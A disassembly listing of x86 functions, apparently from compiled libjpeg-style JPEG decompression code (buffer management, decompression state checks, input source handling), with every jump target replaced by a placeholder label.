lea edx [ ebx + 0x30 ]
call [ ebx + 0x34 ]
jmp r-xdata
add [ esp + 0xc ] edi
add esi [ ebx + 0x14 ]
sub_48cbc0
push ebx
push esi
push edi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov ebx edx
mov [ esp ] eax
mov eax [ ebx + 0x8 ]
shl eax 0x7
mov [ esp + 0x8 ] eax
mov edx [ ebx + 0x18 ]
imul edx [ esp + 0x8 ]
mov [ esp + 0xc ] edx
xor esi esi
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp esi eax
jl r-xdata
sub eax esi
cmp eax [ ebx + 0x14 ]
jle r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
sub eax esi
mov eax [ ebx + 0x14 ]
jmp r-xdata
mov ecx [ ebx + 0x4 ]
sub ecx edx
cmp eax ecx
jl r-xdata
mov eax [ ebx + 0x1c ]
sub eax edx
mov edx [ ebx + 0x18 ]
add edx esi
mov ecx [ ebx + 0x1c ]
sub ecx edx
cmp eax ecx
jl r-xdata
test eax eax
jle r-xdata
mov eax [ ebx + 0x4 ]
sub eax edx
mov edi eax
imul edi [ esp + 0x8 ]
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov ecx [ esp + 0xc ]
lea edx [ ebx + 0x30 ]
push ecx
push edi
mov eax [ ebx ]
mov ecx [ eax + esi * 4 ]
mov eax [ esp + 0x8 ]
call [ ebx + 0x30 ]
mov eax [ esp + 0xc ]
push eax
push edi
mov edx [ ebx ]
mov eax [ esp + 0x8 ]
mov ecx [ edx + esi * 4 ]
lea edx [ ebx + 0x30 ]
call [ ebx + 0x34 ]
jmp r-xdata
add [ esp + 0xc ] edi
add esi [ ebx + 0x14 ]
sub_48cc70
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0x8 ]
add edi eax
cmp edi [ ebx + 0x4 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x16
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
cmp eax [ ebx + 0xc ]
ja r-xdata
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
add eax [ ebx + 0x10 ]
cmp edi eax
jbe r-xdata
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x45
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x1c ]
cmp edi eax
jbe r-xdata
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x8 ]
ja r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x18 ]
jbe r-xdata
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48cb14
xor ecx ecx
mov [ ebx + 0x24 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax edi
sub eax [ ebx + 0x10 ]
test eax eax
jge r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebx + 0x18 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebx + 0x18 ]
shl eax 0x2
add eax [ ebx ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x24 ] 0x1
mov esi [ ebx + 0x1c ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x18 ] eax
xor eax eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48cb14
cmp [ ebx + 0x20 ] 0x0
je r-xdata
mov [ ebx + 0x1c ] edi
mov esi [ ebp - 0x8 ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x16
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x18 ]
sub esi eax
sub edi eax
cmp edi esi
jbe r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
mov [ eax + 0x14 ] 0x16
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov edx [ ebx ]
mov eax [ edx + esi * 4 ]
mov edx [ ebp - 0xc ]
call sub_4977cc
inc esi
cmp edi esi
ja r-xdata
jmp r-xdata
sub_48cdb4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0x8 ]
add edi eax
cmp edi [ ebx + 0x4 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x16
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
cmp eax [ ebx + 0xc ]
ja r-xdata
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
add eax [ ebx + 0x10 ]
cmp edi eax
jbe r-xdata
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x45
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x1c ]
cmp edi eax
jbe r-xdata
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x8 ]
ja r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x18 ]
jbe r-xdata
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48cbc0
xor ecx ecx
mov [ ebx + 0x24 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax edi
sub eax [ ebx + 0x10 ]
test eax eax
jge r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebx + 0x18 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebx + 0x18 ]
shl eax 0x2
add eax [ ebx ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x24 ] 0x1
mov esi [ ebx + 0x1c ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x18 ] eax
xor eax eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48cbc0
cmp [ ebx + 0x20 ] 0x0
je r-xdata
mov [ ebx + 0x1c ] edi
mov esi [ ebp - 0x8 ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x16
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
shl eax 0x7
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x18 ]
sub esi eax
sub edi eax
cmp edi esi
jbe r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
mov [ eax + 0x14 ] 0x16
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov edx [ ebx ]
mov eax [ edx + esi * 4 ]
mov edx [ ebp - 0xc ]
call sub_4977cc
inc esi
cmp edi esi
ja r-xdata
jmp r-xdata
sub_48cefc
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
cmp [ esp + 0x4 ] 0x0
mov esi [ eax + 0x4 ]
jl r-xdata
mov eax [ esp ]
mov eax [ eax ]
mov [ eax + 0x14 ] 0xe
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x4 ] 0x2
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x4 ]
mov eax [ esi + ecx * 4 + 0x3c ]
xor ecx ecx
mov [ esi + edx * 4 + 0x3c ] ecx
test eax eax
je r-xdata
mov ebx [ esi + 0x44 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
mov edx [ esp + 0x4 ]
mov eax [ esi + edx * 4 + 0x34 ]
mov edx [ esp + 0x4 ]
xor ecx ecx
mov [ esi + edx * 4 + 0x34 ] ecx
test eax eax
je r-xdata
mov ebx [ eax + 0x4 ]
mov edi [ eax ]
add ebx [ eax + 0x8 ]
mov edx eax
add ebx 0xc
mov eax [ esp ]
mov ecx ebx
call sub_48d14c
mov eax [ esi + 0x4c ]
sub eax ebx
mov [ esi + 0x4c ] eax
mov eax edi
test eax eax
jne r-xdata
xor edx edx
mov [ esi + 0x44 ] edx
mov ebx [ esi + 0x48 ]
test ebx ebx
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x4 ]
mov edi [ eax ]
add ebx [ eax + 0x8 ]
mov edx eax
add ebx 0xc
mov eax [ esp ]
mov ecx ebx
call sub_48d13c
mov eax [ esi + 0x4c ]
sub eax ebx
mov [ esi + 0x4c ] eax
mov eax edi
test eax eax
jne r-xdata
xor edx edx
mov [ esi + 0x48 ] edx
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov ebx [ ebx + 0x2c ]
test ebx ebx
jne r-xdata
xor eax eax
mov [ ebx + 0x28 ] eax
lea edx [ ebx + 0x30 ]
mov eax [ esp ]
call [ ebx + 0x38 ]
mov ebx [ ebx + 0x2c ]
test ebx ebx
jne r-xdata
xor eax eax
mov [ ebx + 0x28 ] eax
lea edx [ ebx + 0x30 ]
mov eax [ esp ]
call [ ebx + 0x38 ]
sub_48d008
push ebx
push esi
mov esi eax
mov ebx 0x1
mov edx ebx
mov eax esi
call sub_48cefc
dec ebx
test ebx ebx
jge r-xdata
mov ecx 0x54
mov edx [ esi + 0x4 ]
mov eax esi
call sub_48d13c
xor ecx ecx
mov eax esi
mov [ esi + 0x4 ] ecx
call sub_48d174
pop esi
pop ebx
retn
sub_48d040
push ebx
push esi
push edi
mov esi eax
xor eax eax
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax 0x3b9aca00
cmp eax 0x3b9aca00
je r-xdata
mov eax esi
call sub_48d170
mov edi eax
mov edx 0x54
mov eax esi
call sub_48d134
mov ebx eax
test ebx ebx
jne r-xdata
mov edx [ esi ]
mov eax esi
mov [ edx + 0x14 ] 0x3
mov edx [ eax ]
call [ edx ]
mov [ ebx ] sub_48c528
mov edx 0x1
mov [ ebx + 0x4 ] sub_48c658
mov [ ebx + 0x8 ] sub_48c6f8
mov [ ebx + 0xc ] sub_48c7cc
mov [ ebx + 0x10 ] sub_48c8b0
mov [ ebx + 0x14 ] sub_48c918
mov [ ebx + 0x18 ] sub_48c980
mov [ ebx + 0x1c ] sub_48cc70
mov [ ebx + 0x20 ] sub_48cdb4
mov [ ebx + 0x24 ] sub_48cefc
mov [ ebx + 0x28 ] sub_48d008
mov [ ebx + 0x30 ] 0x3b9aca00
mov [ ebx + 0x2c ] edi
lea eax [ ebx + 0x38 ]
mov eax esi
call sub_48d174
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] 0x36
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
xor ecx ecx
dec edx
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
add eax 0xfffffffc
test edx edx
jge r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x44 ] eax
mov [ ebx + 0x48 ] edx
mov [ ebx + 0x4c ] 0x54
mov [ esi + 0x4 ] ebx
pop edi
pop esi
pop ebx
retn
sub_48d178
push ebx
mov ebx eax
push esi
push edi
cmp [ ebx + 0x20 ] 0xffdc
jg r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x29
mov [ eax + 0x18 ] 0xffdc
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x1c ] 0xffdc
jle r-xdata
cmp [ ebx + 0x24 ] 0xa
jle r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xf
mov edx [ ebx + 0xd4 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0xd4 ] 0x8
je r-xdata
mov [ ebx + 0x134 ] 0x1
mov [ ebx + 0x138 ] 0x1
xor edi edi
mov esi [ ebx + 0xd8 ]
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x1a
mov edx [ ebx + 0x24 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] 0xa
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp edi [ ebx + 0x24 ]
jl r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jle r-xdata
mov [ ebx + 0x13c ] 0x8
xor edi edi
mov esi [ ebx + 0xd8 ]
jmp r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x12
mov edx [ eax ]
call [ edx ]
cmp eax 0x4
jg r-xdata
cmp edi [ ebx + 0x24 ]
jl r-xdata
mov eax [ esi + 0x8 ]
mov eax [ ebx + 0x134 ]
jmp r-xdata
cmp [ esi + 0xc ] 0x0
jle r-xdata
mov [ esi + 0x24 ] 0x8
mov edx [ ebx + 0x134 ]
shl edx 0x3
mov eax [ ebx + 0x1c ]
imul eax [ esi + 0x8 ]
call sub_497748
mov [ esi + 0x1c ] eax
mov edx [ ebx + 0x138 ]
shl edx 0x3
mov eax [ ebx + 0x20 ]
imul eax [ esi + 0xc ]
call sub_497748
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x1c ]
imul [ esi + 0x8 ]
mov edx [ ebx + 0x134 ]
call sub_497748
mov [ esi + 0x28 ] eax
mov eax [ ebx + 0x20 ]
imul [ esi + 0xc ]
mov edx [ ebx + 0x138 ]
call sub_497748
mov [ esi + 0x2c ] eax
xor ecx ecx
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x4c ] ecx
inc edi
add esi 0x54
mov edx [ ebx + 0x138 ]
mov eax [ ebx + 0x20 ]
shl edx 0x3
call sub_497748
mov [ ebx + 0x140 ] eax
mov ecx [ ebx + 0x148 ]
cmp ecx [ ebx + 0x24 ]
jl r-xdata
mov ecx [ esi + 0xc ]
mov ecx [ ebx + 0x138 ]
jmp r-xdata
mov [ ebx + 0x134 ] eax
mov edx [ ebx + 0x138 ]
cmp edx [ esi + 0xc ]
jle r-xdata
cmp [ esi + 0xc ] 0x4
jle r-xdata
mov eax [ ebx + 0x1b4 ]
mov [ eax + 0x10 ] 0x1
jmp r-xdata
cmp [ ebx + 0xdc ] 0x0
je r-xdata
mov [ ebx + 0x138 ] ecx
inc edi
add esi 0x54
mov ecx [ ebx + 0x134 ]
cmp ecx [ esi + 0x8 ]
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x1b4 ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
sub_48d340
push ebx
mov ebx eax
push esi
push edi
push ecx
cmp [ ebx + 0x148 ] 0x1
jne r-xdata
mov eax [ ebx + 0x148 ]
test eax eax
jle r-xdata
mov ecx [ ebx + 0x14c ]
mov eax [ ecx + 0x1c ]
mov [ ebx + 0x15c ] eax
mov edx [ ecx + 0x20 ]
mov [ ebx + 0x160 ] edx
xor edx edx
mov [ ecx + 0x34 ] 0x1
mov [ ecx + 0x38 ] 0x1
mov [ ecx + 0x3c ] 0x1
mov eax [ ecx + 0x24 ]
mov [ ecx + 0x40 ] eax
mov [ ecx + 0x44 ] 0x1
mov eax [ ecx + 0x20 ]
mov esi [ ecx + 0xc ]
div esi
mov eax edx
test eax eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x1a
mov edx [ ebx + 0x148 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] 0x4
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp eax 0x4
jle r-xdata
mov [ ecx + 0x48 ] eax
xor edx edx
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] edx
jmp r-xdata
mov eax esi
cmp esi [ ebx + 0x148 ]
jl r-xdata
mov edx [ ebx + 0x134 ]
mov eax [ ebx + 0x1c ]
shl edx 0x3
call sub_497748
mov [ ebx + 0x15c ] eax
mov edx [ ebx + 0x138 ]
mov eax [ ebx + 0x20 ]
shl edx 0x3
call sub_497748
mov [ ebx + 0x160 ] eax
xor ecx ecx
mov [ ebx + 0x164 ] ecx
xor esi esi
lea eax [ ebx + 0x14c ]
mov [ esp ] eax
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
mov ecx [ edx ]
mov eax [ ecx + 0x8 ]
mov [ ecx + 0x34 ] eax
mov eax [ ecx + 0xc ]
mov [ ecx + 0x38 ] eax
mov edx [ ecx + 0x34 ]
imul edx eax
mov [ ecx + 0x3c ] edx
mov eax [ ecx + 0x34 ]
imul [ ecx + 0x24 ]
mov [ ecx + 0x40 ] eax
xor edx edx
mov eax [ ecx + 0x1c ]
mov edi [ ecx + 0x34 ]
div edi
mov eax edx
test eax eax
jne r-xdata
mov [ ecx + 0x44 ] eax
xor edx edx
mov eax [ ecx + 0x20 ]
mov edi [ ecx + 0x38 ]
div edi
mov eax edx
test eax eax
jne r-xdata
mov eax edi
mov [ ecx + 0x48 ] eax
mov edi [ ecx + 0x3c ]
mov eax [ ebx + 0x164 ]
add eax edi
cmp eax 0xa
jle r-xdata
mov eax edi
mov eax edi
add edi 0xffffffff
test eax eax
jg r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0xd
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov ecx [ ebx + 0x164 ]
inc [ ebx + 0x164 ]
mov [ ebx + ecx * 4 + 0x168 ] esi
inc esi
add [ esp ] 0x4
sub_48d4cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
xor eax eax
mov [ esp ] eax
lea edx [ ebx + 0x14c ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ esp ]
cmp edx [ ebx + 0x148 ]
jl r-xdata
mov ecx [ esp + 0x4 ]
mov esi [ ecx ]
cmp [ esi + 0x4c ] 0x0
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp ]
add [ esp + 0x4 ] 0x4
mov edi [ esi + 0x10 ]
test edi edi
jl r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x34
mov [ eax + 0x18 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp edi 0x4
jge r-xdata
cmp [ ebx + edi * 4 + 0xa4 ] 0x0
jne r-xdata
mov eax ebx
mov ecx 0x84
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp ]
mov ebp eax
push 0x84
mov eax [ ebx + edi * 4 + 0xa4 ]
push eax
push ebp
call sub_48ab50
add esp 0xc
mov [ esi + 0x4c ] ebp
sub_48d564
push ebx
mov ebx eax
mov eax ebx
call sub_48d340
mov eax ebx
call sub_48d4cc
mov eax ebx
mov edx [ eax + 0x1bc ]
call [ edx ]
mov eax ebx
mov edx [ eax + 0x1ac ]
call [ edx ]
mov ecx [ ebx + 0x1ac ]
mov edx [ ebx + 0x1b4 ]
mov eax [ ecx + 0x4 ]
mov [ edx ] eax
pop ebx
retn
sub_48d5ac
push ebx
mov ebx eax
push esi
push edi
mov esi [ ebx + 0x1b4 ]
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax + 0x1b8 ]
call [ edx + 0x4 ]
mov edi eax
mov eax edi
sub eax 0x1
jb r-xdata
mov eax 0x2
jmp r-xdata
mov eax edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x18 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_48d178
xor edx edx
mov [ esi + 0x18 ] edx
jmp r-xdata
mov [ esi + 0x14 ] 0x1
cmp [ esi + 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov eax ebx
call sub_48d564
jmp r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x23
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x90 ]
cmp eax [ ebx + 0x98 ]
jge r-xdata
mov edx [ ebx + 0x1b8 ]
cmp [ edx + 0x10 ] 0x0
je r-xdata
mov [ ebx + 0x98 ] eax
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x3b
mov edx [ eax ]
call [ edx ]
jmp r-xdata
sub_48d658
push ebx
mov ebx eax
xor edx edx
xor ecx ecx
mov eax [ ebx + 0x1b4 ]
mov [ eax ] sub_48d5ac
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov eax ebx
mov edx [ eax + 0x1b8 ]
call [ edx ]
xor ecx ecx
mov [ ebx + 0xa0 ] ecx
pop ebx
retn
sub_48d694
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x1c
xor edx edx
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x1b4 ] eax
mov [ eax ] sub_48d5ac
mov [ eax + 0x4 ] sub_48d658
mov [ eax + 0x8 ] sub_48d564
mov [ eax + 0xc ] sub_48d59c
xor edx edx
xor ecx ecx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] 0x1
pop esi
pop ebx
retn
sub_48d6e8
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x18 ]
mov eax [ ebx + 0x1c ]
push eax
push 0x1000
push 0x1
mov edx [ ebx + 0x20 ]
push edx
call sub_48ab64
add esp 0x10
test eax eax
ja r-xdata
mov edx [ ebx + 0x20 ]
xor ecx ecx
mov [ ebx ] edx
mov [ ebx + 0x4 ] eax
mov eax 0x1
mov [ ebx + 0x24 ] ecx
pop esi
pop ebx
retn
cmp [ ebx + 0x24 ] 0x0
je r-xdata
mov ecx [ esi ]
mov eax esi
or edx 0xffffffff
mov [ ecx + 0x14 ] 0x78
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebx + 0x20 ]
mov [ eax ] 0xff
mov [ eax + 0x1 ] 0xd9
mov eax 0x2
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x2a
mov edx [ eax ]
call [ edx ]
sub_48d758
push ebx
push esi
push edi
mov edi eax
mov ebx edx
test ebx ebx
mov esi [ edi + 0x18 ]
jle r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp ebx eax
jg r-xdata
sub ebx eax
mov eax edi
call sub_48d6e8
add [ esi ] ebx
sub [ esi + 0x4 ] ebx
sub_48d788
push ebx
push esi
mov esi eax
push edi
push ebp
mov edi edx
cmp [ esi + 0x18 ] 0x0
jne r-xdata
mov ebx [ esi + 0x18 ]
xor eax eax
xor edx edx
mov [ ebx + 0x8 ] sub_48d6dc
mov [ ebx + 0xc ] sub_48d6e8
mov [ ebx + 0x10 ] sub_48d758
mov [ ebx + 0x14 ] sub_4974b8
mov [ ebx + 0x18 ] sub_48d784
mov [ ebx + 0x1c ] edi
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
mov ecx 0x28
xor edx edx
mov ebx [ eax + 0x4 ]
call [ ebx ]
mov ebx eax
mov eax esi
mov [ esi + 0x18 ] ebx
mov ecx 0x1000
mov ebp [ eax + 0x4 ]
xor edx edx
call [ ebp ]
mov [ ebx + 0x20 ] eax
sub_48d7f4
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0xca
jne r-xdata
cmp [ ebx + 0x14 ] 0xcb
jne r-xdata
mov eax ebx
call sub_48e2a8
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x14 ] 0xcc
je r-xdata
mov edx [ ebx + 0x1b4 ]
cmp [ edx + 0x10 ] 0x0
je r-xdata
mov [ ebx + 0x14 ] 0xcb
mov [ ebx + 0x14 ] 0xcf
mov eax 0x1
pop ebx
retn
mov eax ebx
call sub_48d8bc
pop ebx
retn
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx [ ebx + 0x90 ]
mov [ ebx + 0x98 ] ecx
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax + 0x1b4 ]
call [ edx ]
test eax eax
jne r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
call [ edx ]
cmp eax 0x2
je r-xdata
xor eax eax
pop ebx
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp eax 0x3
je r-xdata
mov edx [ ebx + 0x8 ]
inc [ edx + 0x4 ]
mov ecx [ edx + 0x4 ]
mov eax [ ebx + 0x8 ]
cmp ecx [ eax + 0x8 ]
jl r-xdata
dec eax
jne r-xdata
mov edx [ ebx + 0x140 ]
add [ eax + 0x8 ] edx
jmp r-xdata
sub_48d8bc
push ebx
mov ebx eax
push esi
push edi
cmp [ ebx + 0x14 ] 0xcc
je r-xdata
mov eax [ ebx + 0x1a4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax + 0x1a4 ]
call [ edx ]
xor ecx ecx
mov [ ebx + 0x8c ] ecx
mov [ ebx + 0x14 ] 0xcc
jmp r-xdata
mov edx [ ebx + 0x8c ]
cmp edx [ ebx + 0x74 ]
jb r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax + 0x1a4 ]
call [ edx + 0x4 ]
mov eax ebx
mov edx [ eax + 0x1a4 ]
call [ edx ]
xor ecx ecx
mov [ ebx + 0x8c ] ecx
mov edx 0xcd
mov edx 0xce
jmp r-xdata
mov eax ebx
mov esi [ ebx + 0x8c ]
push 0x0
lea ecx [ ebx + 0x8c ]
mov edi [ eax + 0x1a8 ]
xor edx edx
call [ edi + 0x4 ]
cmp esi [ ebx + 0x8c ]
jne r-xdata
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x74 ]
mov [ eax + 0x8 ] edx
mov eax ebx
mov edx [ eax + 0x8 ]
call [ edx ]
mov [ ebx + 0x14 ] edx
mov eax 0x1
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_48d97c
push ebx
mov ebx eax
push esi
push edi
push ecx
mov edi ecx
cmp [ ebx + 0x14 ] 0xcd
mov esi edx
je r-xdata
mov ecx [ ebx + 0x8c ]
cmp ecx [ ebx + 0x74 ]
jb r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x7b
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
jmp r-xdata
xor ecx ecx
mov eax ebx
mov [ esp ] ecx
push edi
mov edx esi
mov esi [ eax + 0x1a8 ]
lea ecx [ esp + 0x4 ]
call [ esi + 0x4 ]
mov eax [ esp ]
add [ ebx + 0x8c ] eax
mov eax [ esp ]
mov edx [ ebx + 0x8c ]
mov [ eax + 0x4 ] edx
mov ecx [ ebx + 0x74 ]
mov [ eax + 0x8 ] ecx
mov eax ebx
mov edx [ eax + 0x8 ]
call [ edx ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_48da0c
push ebx
mov ebx eax
push esi
push edi
push ebp
mov ebp ecx
cmp [ ebx + 0x14 ] 0xce
mov edi edx
je r-xdata
mov ecx [ ebx + 0x8c ]
cmp ecx [ ebx + 0x74 ]
jb r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x7b
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x138 ]
imul esi [ ebx + 0x13c ]
cmp esi ebp
jbe r-xdata
mov edx [ ebx + 0x8c ]
mov [ eax + 0x4 ] edx
mov ecx [ ebx + 0x74 ]
mov [ eax + 0x8 ] ecx
mov eax ebx
mov edx [ eax + 0x8 ]
call [ edx ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
mov ecx [ eax + 0x1ac ]
call [ ecx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x17
mov eax ebx
mov edx [ eax ]
call [ edx ]
add [ ebx + 0x8c ] esi
mov eax esi
xor eax eax
jmp r-xdata
sub_48dab8
push ebx
mov ebx eax
push esi
mov esi edx
